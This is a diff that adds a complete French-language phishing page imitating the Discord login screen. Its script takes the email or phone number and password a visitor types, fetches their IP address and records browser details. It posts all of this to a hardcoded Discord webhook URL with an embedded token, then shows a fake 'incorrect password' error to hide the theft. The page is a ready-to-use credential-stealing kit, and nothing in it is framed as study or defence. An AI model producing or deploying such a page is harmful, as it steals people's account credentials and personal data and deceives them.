@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion - Discord</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #36393f;
+      font-family: "Segoe UI", sans-serif;
+      color: #dcddde;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #2f3136;
+      padding: 2rem;
+      border-radius: 8px;
+      width: 350px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    .logo img {
+      width: 80px;
+    }
+    h2 {
+      text-align: center;
+      color: white;
+      margin-bottom: 0.3rem;
+    }
+    p {
+      font-size: 0.9rem;
+      color: #b9bbbe;
+      text-align: center;
+    }
+    label {
+      font-weight: bold;
+      font-size: 0.85rem;
+      display: block;
+      margin-top: 1rem;
+    }
+    input {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 0.3rem;
+      border-radius: 3px;
+      background-color: #202225;
+      color: #dcddde;
+      border: 1px solid #72767d;
+    }
+    button {
+      width: 100%;
+      padding: 0.7rem;
+      background-color: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    .error {
+      margin-top: 1rem;
+      color: #f04747;
+      text-align: center;
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/fr/8/80/Discord_Logo.png" alt="Discord Logo">
+    </div>
+    <h2>Connexion à Discord</h2>
+    <p>Continuez vers Discord</p>
+    <form id="loginForm">
+      <label for="username">E-mail ou numéro de téléphone</label>
+      <input type="text" id="username" required />
+
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" required />
+
+      <button type="submit">Connexion</button>
+
+      <div id="error" class="error"></div>
+    </form>
+  </div>
+
+  <script>
+    const webhookUrl = "https://discordapp.com/api/webhooks/1396456507901476956/HNaipsywgYSii1nmfGG_jRXZRgP68L_YTr40fVn5Jln2vgPZWpz8ET9J-SQScS8Pd3HM";
+
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Infos navigateur
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenRes = `${screen.width}x${screen.height}`;
+
+      let ip = "Inconnue";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch {}
+
+      const message = `🔐 **Connexion Discord Fake**\n\n` +
+        `📍 **IP :** \`${ip}\`\n` +
+        `👤 **Username :** \`${username}\`\n` +
+        `🔑 **Password :** \`${password}\`\n\n` +
+        `🌐 **Navigateur :** \`${userAgent}\`\n` +
+        `🖥️ **Résolution écran :** \`${screenRes}\`\n` +
+        `🕐 **Fuseau horaire :** \`${timezone}\`\n` +
+        `🌍 **Langue :** \`${language}\``;
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message }),
+      });
+
+      // Affiche erreur simulée
+      document.getElementById("error").textContent = "Mot de passe ou email incorrect.";
+    });
+  </script>
+</body>
+</html>
